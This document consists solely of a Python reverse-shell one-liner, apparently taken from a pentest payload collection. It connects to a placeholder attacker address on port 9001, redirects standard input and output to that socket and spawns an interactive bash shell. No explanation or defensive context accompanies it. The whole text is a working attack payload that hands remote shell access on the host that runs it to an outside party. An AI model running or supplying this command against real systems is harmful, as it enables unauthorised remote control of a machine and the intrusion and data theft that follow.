python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker IP>",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
